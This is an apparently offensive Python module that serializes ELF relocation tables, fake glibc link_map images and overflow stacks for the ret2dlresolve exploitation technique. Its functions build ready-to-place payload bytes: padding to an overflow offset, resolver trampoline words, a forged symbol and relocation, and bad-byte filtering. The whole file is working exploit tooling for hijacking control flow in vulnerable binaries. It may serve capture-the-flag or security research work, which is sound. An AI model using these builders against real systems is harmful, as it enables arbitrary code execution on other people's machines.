"""Deep offline ELF loader, link_map, relocation and resolver serializers.

ELF record layouts are stable ABI; glibc's private ``struct link_map`` layout
is not.  Consequently every private-field offset is supplied through
``LinkMapLayout`` rather than guessed from a version string.  Builders produce
bytes and placement maps only and explicitly describe remaining rtld state.
"""
from __future__ import annotations

from dataclasses import dataclass
import struct
from typing import Iterable, Mapping, Sequence

try:
    from .contract import BuildError, PayloadBuild, ensure_uint, reject_bad_bytes
except ImportError:  # pragma: no cover
    from contract import BuildError, PayloadBuild, ensure_uint, reject_bad_bytes


MAX_IMAGE = 16 * 1024 * 1024
MAX_RECORDS = 4096

# ELF dynamic tags used by _dl_fixup.
DT_NULL = 0
DT_PLTRELSZ = 2
DT_STRTAB = 5
DT_SYMTAB = 6
DT_RELA = 7
DT_RELAENT = 9
DT_SYMENT = 11
DT_REL = 17
DT_RELENT = 19
DT_PLTREL = 20
DT_JMPREL = 23


@dataclass(frozen=True)
class RelocationSpec:
    offset: int
    symbol_index: int
    relocation_type: int
    addend: int = 0


@dataclass(frozen=True)
class LinkMapLayout:
    """Caller-supplied private ``struct link_map`` field layout."""

    size: int
    l_addr: int
    l_name: int
    l_ld: int
    l_next: int
    l_prev: int
    l_info: int
    pointer_size: int = 8
    info_slots: int = 80

    def validate(self) -> None:
        if isinstance(self.size, bool) or not isinstance(self.size, int):
            raise BuildError("link_map size must be an integer")
        if self.pointer_size not in {4, 8}:
            raise BuildError("link_map pointer_size must be 4 or 8")
        if not 1 <= self.info_slots <= 4096:
            raise BuildError("link_map info_slots must be in 1..4096")
        if not self.pointer_size <= self.size <= MAX_IMAGE:
            raise BuildError("link_map size is invalid")
        fields = (self.l_addr, self.l_name, self.l_ld, self.l_next, self.l_prev, self.l_info)
        if any(isinstance(value, bool) or not isinstance(value, int) or value < 0 for value in fields):
            raise BuildError("link_map offsets must be non-negative integers")
        if any(value + self.pointer_size > self.size for value in fields[:5]):
            raise BuildError("link_map scalar field exceeds image size")
        if self.l_info + self.info_slots * self.pointer_size > self.size:
            raise BuildError("link_map l_info vector exceeds image size")
        intervals = [
            ("l_addr", self.l_addr, self.l_addr + self.pointer_size),
            ("l_name", self.l_name, self.l_name + self.pointer_size),
            ("l_ld", self.l_ld, self.l_ld + self.pointer_size),
            ("l_next", self.l_next, self.l_next + self.pointer_size),
            ("l_prev", self.l_prev, self.l_prev + self.pointer_size),
            ("l_info", self.l_info, self.l_info + self.info_slots * self.pointer_size),
        ]
        for index, (left_name, left_start, left_end) in enumerate(intervals):
            for right_name, right_start, right_end in intervals[index + 1:]:
                if max(left_start, right_start) < min(left_end, right_end):
                    raise BuildError(f"link_map fields overlap: {left_name} and {right_name}")


def _abi(architecture: str) -> tuple[int, str]:
    if not isinstance(architecture, str):
        raise BuildError("ELF architecture must be a string")
    aliases = {"x86_64": "amd64", "x64": "amd64", "x86": "i386"}
    architecture = aliases.get(architecture, architecture)
    if architecture == "amd64":
        return 64, "little"
    if architecture == "i386":
        return 32, "little"
    if architecture == "aarch64":
        return 64, "little"
    if architecture == "arm":
        return 32, "little"
    if architecture == "mips":
        return 32, "big"
    if architecture == "mipsel":
        return 32, "little"
    if architecture in {"riscv", "riscv64"}:
        return 64, "little"
    raise BuildError(f"unsupported ELF architecture: {architecture}")


def _pack_uint(value: int, bits: int, endian: str, name: str) -> bytes:
    ensure_uint(value, bits, name=name)
    return value.to_bytes(bits // 8, endian)


def _pack_sint(value: int, bits: int, endian: str, name: str) -> bytes:
    if isinstance(value, bool) or not isinstance(value, int) or not -(1 << (bits - 1)) <= value < (1 << (bits - 1)):
        raise BuildError(f"{name} does not fit signed {bits} bits")
    return value.to_bytes(bits // 8, endian, signed=True)


def _align(value: int, alignment: int) -> int:
    if alignment <= 0:
        raise BuildError("alignment must be positive")
    return ((value + alignment - 1) // alignment) * alignment


def _ensure_address_range(start: int, size: int, bits: int, *, name: str) -> None:
    """Reject a serialized image that wraps its target ABI address space."""

    ensure_uint(start, bits, name=f"{name} start")
    if isinstance(size, bool) or not isinstance(size, int) or size < 0:
        raise BuildError(f"{name} size must be a non-negative integer")
    if size > (1 << bits) - start:
        raise BuildError(f"{name} exceeds the {bits}-bit address space")


def build_dynamic_vector(
    entries: Sequence[tuple[int, int]],
    *,
    bits: int = 64,
    endian: str = "little",
    terminate: bool = True,
    base_address: int = 0,
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Serialize ``Elf{32,64}_Dyn`` records with an optional DT_NULL."""

    if bits not in {32, 64} or endian not in {"little", "big"}:
        raise BuildError("dynamic vector requires 32/64 bits and little/big endian")
    if not isinstance(entries, (list, tuple)):
        raise BuildError("dynamic entries must be a list or tuple of (tag, value) records")
    if len(entries) > MAX_RECORDS:
        raise BuildError(f"dynamic entries must contain at most {MAX_RECORDS} records")
    if not entries and not terminate:
        raise BuildError("dynamic vector cannot be empty without a terminator")
    word = bits // 8
    data = bytearray()
    placements: dict[str, int] = {}
    widths: dict[str, int] = {}
    seen_null = False
    for index, pair in enumerate(entries):
        if not isinstance(pair, tuple) or len(pair) != 2:
            raise BuildError("dynamic entries must be (tag, value) tuples")
        tag, value = pair
        if isinstance(tag, bool) or not isinstance(tag, int) or not -(1 << (bits - 1)) <= tag < (1 << (bits - 1)):
            raise BuildError("dynamic tag is out of range")
        placements[f"dyn[{index}]"] = len(data)
        widths[f"dyn[{index}]"] = 2 * word
        placements[f"dyn[{index}].tag"] = len(data)
        widths[f"dyn[{index}].tag"] = word
        data += _pack_sint(tag, bits, endian, f"dyn[{index}].tag")
        placements[f"dyn[{index}].value"] = len(data)
        widths[f"dyn[{index}].value"] = word
        data += _pack_uint(value, bits, endian, f"dyn[{index}].value")
        seen_null |= tag == DT_NULL
    if terminate and not seen_null:
        index = len(entries)
        placements["dyn[null]"] = len(data)
        widths["dyn[null]"] = 2 * word
        data += b"\x00" * (2 * word)
    raw = bytes(data)
    reject_bad_bytes(raw, bad_bytes)
    _ensure_address_range(base_address, len(raw), bits, name="dynamic vector")
    return PayloadBuild(
        raw, placements, widths,
        architecture=f"elf{bits}-{endian}",
        strategy="elf-dynamic-vector",
        base_address=base_address,
        metadata={"terminated": str(terminate), "record_size": str(2 * word)},
    )


def build_relocation_table(
    entries: Sequence[RelocationSpec],
    *,
    architecture: str = "amd64",
    rela: bool = True,
    base_address: int = 0,
    bad_bytes: Iterable[int] = (),
    endian: str | None = None,
) -> PayloadBuild:
    """Serialize REL or RELA records for 32- or 64-bit ELF ABIs."""

    bits, default_endian = _abi(architecture)
    endian = default_endian if endian is None else endian
    if endian not in {"little", "big"}:
        raise BuildError("endian must be little or big")
    if not entries or len(entries) > MAX_RECORDS or any(not isinstance(item, RelocationSpec) for item in entries):
        raise BuildError(f"entries must contain 1..{MAX_RECORDS} RelocationSpec records")
    word = bits // 8
    data = bytearray()
    placements: dict[str, int] = {}
    widths: dict[str, int] = {}
    for index, item in enumerate(entries):
        ensure_uint(item.offset, bits, name=f"rel[{index}].offset")
        if bits == 64:
            ensure_uint(item.symbol_index, 32, name=f"rel[{index}].symbol_index")
            ensure_uint(item.relocation_type, 32, name=f"rel[{index}].type")
            info = (item.symbol_index << 32) | item.relocation_type
        else:
            ensure_uint(item.symbol_index, 24, name=f"rel[{index}].symbol_index")
            ensure_uint(item.relocation_type, 8, name=f"rel[{index}].type")
            info = (item.symbol_index << 8) | item.relocation_type
        start = len(data)
        placements[f"rel[{index}]"] = start
        placements[f"rel[{index}].offset"] = start
        widths[f"rel[{index}].offset"] = word
        data += _pack_uint(item.offset, bits, endian, f"rel[{index}].offset")
        placements[f"rel[{index}].info"] = len(data)
        widths[f"rel[{index}].info"] = word
        data += _pack_uint(info, bits, endian, f"rel[{index}].info")
        if rela:
            placements[f"rel[{index}].addend"] = len(data)
            widths[f"rel[{index}].addend"] = word
            data += _pack_sint(item.addend, bits, endian, f"rel[{index}].addend")
        widths[f"rel[{index}]"] = len(data) - start
    raw = bytes(data)
    reject_bad_bytes(raw, bad_bytes)
    _ensure_address_range(base_address, len(raw), bits, name="relocation table")
    return PayloadBuild(
        raw, placements, widths,
        architecture=architecture,
        strategy="elf-rela-table" if rela else "elf-rel-table",
        base_address=base_address,
        metadata={"record_size": str((3 if rela else 2) * word)},
    )


def build_relr_table(
    addresses: Sequence[int],
    *,
    bits: int = 64,
    endian: str = "little",
    base_address: int = 0,
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Encode sorted relative relocation addresses using the ELF RELR bitmap ABI."""

    if bits not in {32, 64} or endian not in {"little", "big"}:
        raise BuildError("RELR requires 32/64 bits and little/big endian")
    if not isinstance(addresses, (list, tuple)) or not addresses or len(addresses) > MAX_RECORDS:
        raise BuildError(f"addresses must contain 1..{MAX_RECORDS} values")
    if any(isinstance(address, bool) or not isinstance(address, int) for address in addresses):
        raise BuildError("RELR addresses must be integers")
    word = bits // 8
    pending = sorted(set(addresses))
    if len(pending) != len(addresses):
        raise BuildError("RELR addresses must be unique")
    for address in pending:
        ensure_uint(address, bits, name="RELR address")
        if address % word:
            raise BuildError("RELR addresses must be word aligned")
    encoded: list[int] = []
    cursor = 0
    while cursor < len(pending):
        direct = pending[cursor]
        encoded.append(direct)
        cursor += 1
        base = direct + word
        while cursor < len(pending):
            bitmap = 1
            scan = cursor
            limit = base + (bits - 1) * word
            while scan < len(pending) and pending[scan] < limit:
                delta = pending[scan] - base
                if delta < 0 or delta % word:
                    raise BuildError("RELR addresses are not monotonically encodable")
                bitmap |= 1 << (delta // word + 1)
                scan += 1
            if bitmap == 1:
                break
            encoded.append(bitmap)
            cursor = scan
            base += (bits - 1) * word
    payload = b"".join(_pack_uint(value, bits, endian, "RELR entry") for value in encoded)
    placements = {f"relr[{index}]": index * word for index in range(len(encoded))}
    widths = {key: word for key in placements}
    reject_bad_bytes(payload, bad_bytes)
    _ensure_address_range(base_address, len(payload), bits, name="RELR table")
    return PayloadBuild(
        payload, placements, widths,
        architecture=f"elf{bits}-{endian}",
        strategy="elf-relr-table",
        base_address=base_address,
        metadata={"relocation_count": str(len(addresses)), "entry_count": str(len(encoded))},
    )


def build_link_map_image(
    layout: LinkMapLayout,
    *,
    base_address: int,
    l_addr: int,
    l_name: int,
    l_ld: int,
    l_next: int = 0,
    l_prev: int = 0,
    l_info: Mapping[int, int] | None = None,
    extra_fields: Mapping[str, tuple[int, int]] | None = None,
    endian: str = "little",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Serialize caller-specified private link_map fields and l_info pointers."""

    if not isinstance(layout, LinkMapLayout):
        raise BuildError("layout must be a LinkMapLayout")
    layout.validate()
    if endian not in {"little", "big"}:
        raise BuildError("endian must be little or big")
    bits, word = layout.pointer_size * 8, layout.pointer_size
    _ensure_address_range(base_address, layout.size, bits, name="link_map image")
    data = bytearray(layout.size)
    placements: dict[str, int] = {}
    widths: dict[str, int] = {}
    occupied: list[tuple[str, int, int]] = []

    def put(label: str, offset: int, value: int) -> None:
        if offset < 0 or offset + word > len(data):
            raise BuildError(f"link_map field {label} is outside image")
        if label in placements:
            raise BuildError(f"duplicate link_map field {label}")
        for old_label, old_start, old_end in occupied:
            if max(offset, old_start) < min(offset + word, old_end):
                raise BuildError(f"link_map fields overlap: {old_label} and {label}")
        data[offset:offset + word] = _pack_uint(value, bits, endian, label)
        placements[label] = offset
        widths[label] = word
        occupied.append((label, offset, offset + word))

    for label, offset, value in (
        ("l_addr", layout.l_addr, l_addr), ("l_name", layout.l_name, l_name),
        ("l_ld", layout.l_ld, l_ld), ("l_next", layout.l_next, l_next),
        ("l_prev", layout.l_prev, l_prev),
    ):
        put(label, offset, value)
    for tag, pointer in sorted((l_info or {}).items()):
        if isinstance(tag, bool) or not isinstance(tag, int) or not 0 <= tag < layout.info_slots:
            raise BuildError("l_info tag is outside supplied layout vector")
        put(f"l_info[{tag}]", layout.l_info + tag * word, pointer)
    for label, pair in sorted((extra_fields or {}).items()):
        if not isinstance(pair, tuple) or len(pair) != 2:
            raise BuildError("extra_fields values must be (offset, value)")
        offset, value = pair
        if isinstance(offset, bool) or not isinstance(offset, int):
            raise BuildError("extra_fields offsets must be integers")
        info_end = layout.l_info + layout.info_slots * word
        if max(offset, layout.l_info) < min(offset + word, info_end):
            raise BuildError(f"extra link_map field overlaps reserved l_info vector: {label}")
        put(f"extra.{label}", offset, value)
    raw = bytes(data)
    reject_bad_bytes(raw, bad_bytes)
    return PayloadBuild(
        raw, placements, widths,
        architecture=f"link-map-{bits}",
        strategy="glibc-link-map-image",
        base_address=base_address,
        metadata={"private_layout": "caller-supplied", "info_slots": str(layout.info_slots)},
    )


def build_dl_runtime_resolve_stack(
    *,
    architecture: str,
    resolver_entry: int,
    link_map: int,
    relocation_selector: int,
    return_address: int,
    arguments: Sequence[int] = (),
    overflow_offset: int = 0,
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Serialize a direct loader-resolver trampoline stack contract."""

    bits, endian = _abi(architecture)
    if architecture not in {"amd64", "i386"}:
        raise BuildError("direct resolver stacks support amd64 and i386")
    if isinstance(overflow_offset, bool) or not isinstance(overflow_offset, int) or not 0 <= overflow_offset <= MAX_IMAGE:
        raise BuildError(f"overflow_offset must be in 0..{MAX_IMAGE}")
    if not isinstance(fill, bytes) or len(fill) != 1:
        raise BuildError("fill must be one byte")
    if not isinstance(arguments, (list, tuple)):
        raise BuildError("arguments must be a list or tuple")
    if len(arguments) > 32:
        raise BuildError("resolver argument tail is capped at 32 words")
    word = bits // 8
    data = bytearray(fill * overflow_offset)
    placements: dict[str, int] = {"padding": 0} if overflow_offset else {}
    widths: dict[str, int] = {"padding": overflow_offset} if overflow_offset else {}

    def add(label: str, value: int) -> None:
        placements[label] = len(data)
        widths[label] = word
        data.extend(_pack_uint(value, bits, endian, label))

    add("resolver_entry", resolver_entry)
    add("link_map", link_map)
    add("relocation_selector", relocation_selector)
    add("return_address", return_address)
    for index, value in enumerate(arguments):
        add(f"argument[{index}]", value)
    raw = bytes(data)
    reject_bad_bytes(raw, bad_bytes)
    return PayloadBuild(
        raw, placements, widths,
        architecture=architecture,
        strategy="direct-dl-runtime-resolve-stack",
        metadata={
            "selector_units": "rela-index" if architecture == "amd64" else "rel-byte-offset",
            "trampoline_contract": "caller must confirm resolver entry ABI and preserved rtld state",
        },
    )


def build_dl_fixup_bundle(
    layout: LinkMapLayout,
    *,
    architecture: str,
    image_address: int,
    l_addr: int,
    symbol_name: bytes,
    relocation_target: int,
    relocation_type: int,
    glibc_version: str,
    endian: str | None = None,
    extra_link_map_fields: Mapping[str, tuple[int, int]] | None = None,
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Build a self-consistent fake link_map/Dyn/strtab/symtab/JMPREL image.

    This goes beyond classic stack-only ret2dlresolve by materializing the
    private link_map l_info vector.  The caller must still provide any glibc-
    version-specific scope, namespace, lock, and audit fields through
    ``extra_link_map_fields`` and a matching ``LinkMapLayout``.
    """

    bits, default_endian = _abi(architecture)
    endian = endian or default_endian
    if layout.pointer_size * 8 != bits:
        raise BuildError("link_map pointer size does not match architecture")
    layout.validate()
    if not isinstance(symbol_name, bytes) or not symbol_name or b"\x00" in symbol_name or len(symbol_name) > 4096:
        raise BuildError("symbol_name must be bounded non-NUL bytes")
    ensure_uint(image_address, bits, name="image_address")
    ensure_uint(l_addr, bits, name="l_addr")
    word = bits // 8
    dyn_entry_size = 2 * word
    sym_size = 24 if bits == 64 else 16
    rel_size = 24 if bits == 64 else 8
    rela = bits == 64
    tags = (DT_STRTAB, DT_SYMTAB, DT_JMPREL, DT_PLTRELSZ, DT_PLTREL, DT_SYMENT,
            DT_RELAENT if rela else DT_RELENT)
    dynamic_offset = _align(layout.size, word)
    dynamic_size = (len(tags) + 1) * dyn_entry_size
    string_offset = _align(dynamic_offset + dynamic_size, word)
    string_table = b"\x00" + symbol_name + b"\x00"
    symbol_offset = _align(string_offset + len(string_table), sym_size)
    symbol_table_size = 2 * sym_size  # null symbol then symbol index one
    relocation_offset = _align(symbol_offset + symbol_table_size, word)
    total_size = relocation_offset + rel_size
    if total_size > MAX_IMAGE:
        raise BuildError("dl-fixup image exceeds cap")
    _ensure_address_range(image_address, total_size, bits, name="dl-fixup image")

    addresses = {
        "dynamic": image_address + dynamic_offset,
        "strtab": image_address + string_offset,
        "symtab": image_address + symbol_offset,
        "jmprel": image_address + relocation_offset,
    }
    # Dynamic d_ptr values are interpreted through D_PTR as l_addr + d_ptr.
    for key in ("strtab", "symtab", "jmprel"):
        if addresses[key] < l_addr:
            raise BuildError(f"{key} address precedes l_addr")
    dyn_values = {
        DT_STRTAB: addresses["strtab"] - l_addr,
        DT_SYMTAB: addresses["symtab"] - l_addr,
        DT_JMPREL: addresses["jmprel"] - l_addr,
        DT_PLTRELSZ: rel_size,
        DT_PLTREL: DT_RELA if rela else DT_REL,
        DT_SYMENT: sym_size,
        (DT_RELAENT if rela else DT_RELENT): rel_size,
    }
    dyn_entries = tuple((tag, dyn_values[tag]) for tag in tags)
    dynamic = build_dynamic_vector(
        dyn_entries, bits=bits, endian=endian, base_address=addresses["dynamic"]
    )
    l_info = {
        tag: addresses["dynamic"] + index * dyn_entry_size
        for index, tag in enumerate(tags)
    }
    link_map = build_link_map_image(
        layout,
        base_address=image_address,
        l_addr=l_addr,
        l_name=addresses["strtab"],
        l_ld=addresses["dynamic"],
        l_info=l_info,
        extra_fields=extra_link_map_fields,
        endian=endian,
    )
    if bits == 64:
        symbol = struct.pack(("<" if endian == "little" else ">") + "IBBHQQ", 1, 0x12, 0, 0, 0, 0)
    else:
        symbol = struct.pack(("<" if endian == "little" else ">") + "IIIBBH", 1, 0, 0, 0x12, 0, 0)
    relocation = build_relocation_table(
        (RelocationSpec(relocation_target, 1, relocation_type, 0),),
        architecture=architecture, rela=rela, base_address=addresses["jmprel"], endian=endian,
    )
    data = bytearray(total_size)
    data[:len(link_map.payload)] = link_map.payload
    data[dynamic_offset:dynamic_offset + len(dynamic.payload)] = dynamic.payload
    data[string_offset:string_offset + len(string_table)] = string_table
    data[symbol_offset + sym_size:symbol_offset + 2 * sym_size] = symbol
    data[relocation_offset:relocation_offset + len(relocation.payload)] = relocation.payload
    placements: dict[str, int] = {
        "link_map": 0, "dynamic": dynamic_offset, "string_table": string_offset,
        "symbol_name": string_offset + 1, "symbol_table": symbol_offset,
        "fake_symbol": symbol_offset + sym_size, "jmprel": relocation_offset,
        "fake_relocation": relocation_offset,
    }
    widths: dict[str, int] = {
        "link_map": layout.size, "dynamic": len(dynamic.payload),
        "string_table": len(string_table), "symbol_name": len(symbol_name),
        "symbol_table": symbol_table_size, "fake_symbol": sym_size,
        "jmprel": rel_size, "fake_relocation": rel_size,
    }
    for name, offset in link_map.placements.items():
        placements[f"link_map.{name}"] = offset
        widths[f"link_map.{name}"] = link_map.widths[name]
    for name, offset in dynamic.placements.items():
        placements[f"dynamic.{name}"] = dynamic_offset + offset
        if name in dynamic.widths:
            widths[f"dynamic.{name}"] = dynamic.widths[name]
    raw = bytes(data)
    reject_bad_bytes(raw, bad_bytes)
    return PayloadBuild(
        raw, placements, widths,
        architecture=architecture,
        strategy="fake-link-map-dl-fixup-bundle",
        base_address=image_address,
        metadata={
            "glibc_version": glibc_version,
            "private_layout": "caller-supplied",
            "symbol_index": "1",
            "relocation_selector": "0",
            "remaining_state": "scope/namespace/audit/lock fields are caller responsibility",
        },
    )

